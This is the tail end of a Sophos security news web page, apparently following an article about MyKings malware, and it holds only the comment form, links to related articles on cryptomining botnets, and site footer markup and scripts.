					</div> <!-- .author-bio -->
				</div> <!-- .author-description -->
			</div> <!-- .author-block-container -->
			</div>

			
<div id="comments" class="comments-area">

	
	
	
		<div id="respond" class="comment-respond">
		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/en-us/2020/07/02/mykings-jumps-on-the-corona-train/#respond" style="display:none;">Cancel reply</a></small></h3><form action="https://news.sophos.com/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate><p class="comment-notes"><span id="email-notes">Your email address will not be published.</span></p><p class="comment-form-comment"><label for="comment">Comment</label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" required="required"></textarea></p><p class="comment-form-author"><label for="author">Name</label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" /></p>
<p class="comment-form-email"><label for="email">Email</label> <input id="email" name="email" type="email" value="" size="30" maxlength="100" aria-describedby="email-notes" /></p>
<p class="comment-form-url"><label for="url">Website</label> <input id="url" name="url" type="url" value="" size="30" maxlength="200" /></p>
<p class="comment-form-cookies-consent"><input id="wp-comment-cookies-consent" name="wp-comment-cookies-consent" type="checkbox" value="yes" /> <label for="wp-comment-cookies-consent">Save my name, email, and website in this browser for the next time I comment.</label></p>
<input type="hidden" name="redirect_to" value="https://news.sophos.com/en-us/2020/07/02/mykings-jumps-on-the-corona-train/" id="redirect_to"><p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment" /> <input type='hidden' name='comment_post_ID' value='67566' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
</p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="952ff1a62b" /></p><input type="hidden" id="ak_js" name="ak_js" value="216"/><textarea name="ak_hp_textarea" cols="45" rows="8" maxlength="100" style="display: none !important;"></textarea></form>	</div><!-- #respond -->
	
</div><!-- #comments -->

		
		</main><!-- #main -->
	</div><!-- #primary -->


<div id="secondary" class="widget-area" role="complementary">
			
		<div id="second-article-wrapper" class="article-wrapper">
			<h3 class="widget-title">You might also enjoy...</h3>
			<article id="post-67094" class="second-featured post-67094 post type-post status-publish format-standard has-post-thumbnail hentry category-sophoslabs-uncut tag-bitcoin tag-kingminer tag-monero tag-xmrig region-en-us">
	<div class="second-featured__image" style="background-image: url('https://news.sophos.com/wp-content/uploads/2020/06/sophoslabs-kingminer-botnet-report-1200x628-blank.jpg?w=640');">
		<div class="featured-entry-meta">
			<div class="featured-entry-date">
				<span class="day-num">09</span>
				<span class="month">Jun</span>
			</div>
		</div>
	</div>
	<div class="second-featured__content">
		<header class="featured-entry-header">
			<div class="featured-entry-categories">
					<a href="https://news.sophos.com/en-us/category/sophoslabs/sophoslabs-uncut/">SophosLabs Uncut</a>			</div>
			<h1 class="featured-entry-title dot-ellipsis dot-resize-update dot-load-update dot-height-130"><a href="https://news.sophos.com/en-us/2020/06/09/kingminer-report/" rel="bookmark">Kingminer escalates attack complexity for cryptomining</a></h1>		</header> <!-- featured-entry-header -->
	</div>
</article> <!-- post -->
<article id="post-62764" class="second-featured post-62764 post type-post status-publish format-standard has-post-thumbnail hentry category-sophoslabs-uncut tag-cryptominers tag-darkcloud tag-forshare tag-ipc tag-monero tag-ms-sql tag-mykings tag-mysql tag-rdp tag-smominru tag-ssh tag-telnet tag-wmi region-en-us">
	<div class="second-featured__image" style="background-image: url('https://news.sophos.com/wp-content/uploads/2019/12/tay-plus-data-no-text.png?w=640');">
		<div class="featured-entry-meta">
			<div class="featured-entry-date">
				<span class="day-num">18</span>
				<span class="month">Dec</span>
			</div>
		</div>
	</div>
	<div class="second-featured__content">
		<header class="featured-entry-header">
			<div class="featured-entry-categories">
					<a href="https://news.sophos.com/en-us/category/sophoslabs/sophoslabs-uncut/">SophosLabs Uncut</a>			</div>
			<h1 class="featured-entry-title dot-ellipsis dot-resize-update dot-load-update dot-height-130"><a href="https://news.sophos.com/en-us/2019/12/18/mykings-botnet-spreads-headaches-cryptominers-and-forshare-malware/" rel="bookmark">MyKings botnet spreads headaches, cryptominers, and Forshare malware</a></h1>		</header> <!-- featured-entry-header -->
	</div>
</article> <!-- post -->
<article id="post-56304" class="second-featured post-56304 post type-post status-publish format-standard has-post-thumbnail hentry category-sophoslabs-uncut tag-android tag-cryptocurrency tag-cryptomining tag-malware tag-miner tag-mobile tag-ufo region-en-us">
	<div class="second-featured__image" style="background-image: url('https://news.sophos.com/wp-content/uploads/2017/11/malwares-android.jpg?w=640');">
		<div class="featured-entry-meta">
			<div class="featured-entry-date">
				<span class="day-num">26</span>
				<span class="month">Feb</span>
			</div>
		</div>
	</div>
	<div class="second-featured__content">
		<header class="featured-entry-header">
			<div class="featured-entry-categories">
					<a href="https://news.sophos.com/en-us/category/sophoslabs/sophoslabs-uncut/">SophosLabs Uncut</a>			</div>
			<h1 class="featured-entry-title dot-ellipsis dot-resize-update dot-load-update dot-height-130"><a href="https://news.sophos.com/en-us/2019/02/26/automated-android-attacks-deliver-ufo-cryptominer-trojan/" rel="bookmark">Automated Android attacks deliver &#8220;UFO&#8221; cryptominer Trojan</a></h1>		</header> <!-- featured-entry-header -->
	</div>
</article> <!-- post -->
		</div>

	</div> <!-- #secondary -->


		</div> <!-- .container -->
	</div> <!-- #content -->
	<footer>
		<section class="cta">
			<p>Start a Sophos demo in less than a minute. See exactly how our solutions work in a full environment without a commitment.</p>
			<a href="https://secure2.sophos.com/en-us/products/demos.aspx?cmp=70130000001xKqzAAE">Learn More</a>
		</section>
		<section class="connected">
			<div class="social">
				<h3>Stay Connected</h3>
				<ul>
					<li><a href="https://www.facebook.com/securitybysophos" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/facebook-icon.svg?la=en&amp;hash=1CA0A5A0E9C9999E7E079A5D32C86E9BF9C7AD1E" alt="Facebook"></a>
					</li>
					<li><a href="https://www.instagram.com/sophossecurity/" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/instagram-icon.svg?la=en&amp;hash=2B50C2B67C3023D9E7D4E1C3A16401EAD8F10F76" alt="Instagram"></a>
					</li>
					<li><a href="https://www.linkedin.com/company/sophos" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/linkedin-icon.svg?la=en&amp;hash=B6D5378C1E1A16F239A4C862EAE3499B8EC1F3F9" alt="LinkedIn"></a></li>
					<li><a href="https://www.sophos.com/en-us/company/rss-feeds.aspx"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/rss-icon.svg?la=en&amp;hash=76C4DAFD331DC675814191A66794A778D8C6DCF7" alt="RSS"></a></li>
					<li><a href="https://twitter.com/Sophos" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/twitter-icon.svg?la=en&amp;hash=9A90D9F99ABE6454741BBAAF9C3FB6966624C92D" alt="Twitter"></a></li>
					<li><a href="https://www.youtube.com/user/SophosProducts" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/youtube-icon.svg?la=en&amp;hash=CCCF647AFA78C8DB74D654DB9FEFBF0AC54F42D3" alt="YouTube"></a></li>
				</ul>
			</div>
			<ul class="links">
				<li><a href="https://www.sophos.com/en-us/company/careers.aspx">Careers </a></li>
				<li><a href="https://www.sophos.com/en-us/partners/partner-locator.aspx">Find a Partner</a></li>
				<li><a href="https://secure2.sophos.com/en-us/support.aspx">Support</a></li>
				<li><a href="https://www.sophos.com/en-us/threat-center/technical-papers.aspx">Technical Papers</a></li>
				<li><a href="https://www.sophos.com/en-us/security-news-trends/whitepapers.aspx">Whitepapers</a></li>
			</ul>
		</section>
		<section class="legal">
			<div class="copyright">&copy; 1997 - 2021 Sophos Ltd. All rights reserved</div>
			<ul>
				<li><a href="https://www.sophos.com/en-us/legal.aspx">Legal</a></li>
				<li><a href="https://www.sophos.com/en-us/legal/sophos-group-privacy-policy.aspx">Privacy</a></li>
				<li><a href="https://www.sophos.com/en-us/legal/cookie-information.aspx">Cookie Information</a></li>
				<li><a href="https://www.sophos.com/en-us/legal/modern-slavery-act-transparency-statement.aspx">Modern Slavery Statement</a></li>
			</ul>
		</section>
		<div class="vip" style="background: #002939">
			Powered by <a href="https://wpvip.com/?utm_source=vip_powered_wpcom&#038;utm_medium=web&#038;utm_campaign=VIP%20Footer%20Credit&#038;utm_term=news.sophos.com" rel="generator nofollow" class="powered-by-wpcom">WordPress VIP</a>		</div>
	</footer>
	<script id='sophos-js-core-js-extra'>
var PG8Data = {"startPage":"1","maxPages":"1","nextLink":""};
</script>
<script type='text/javascript' src='https://news.sophos.com/_static/??-eJyVkEEOwiAQRS8kIF20K+NRDLZjS8sAYcDq7R3TNHHhomTY8Hnvk4xao+iDz+CzyhMgkKIQp0AeVhLNWXdqJj4MhcWCeDaykZoDuQVyppM61NGHVEHDKydDx/ktkiVbV2/1BqOxo68Wo0nZQ6r2RlOtfLNdsr53ZQDa1orIBSJBdG+J1v+D+Ap4h+H3ff8Zi4iujNaTMoslhKxu7KpHSMjsFS+65em0PrfzB20wygw='></script>
<script src='https://stats.wp.com/e-202112.js' defer></script>
<script>
	_stq = window._stq || [];
	_stq.push([ 'view', {v:'ext',j:'1:9.5.2',blog:'166161023',post:'67566',tz:'-4',srv:'news.sophos.com'} ]);
	_stq.push([ 'clickTrackerInit', '166161023', '67566' ]);
</script>
</body>
</html>
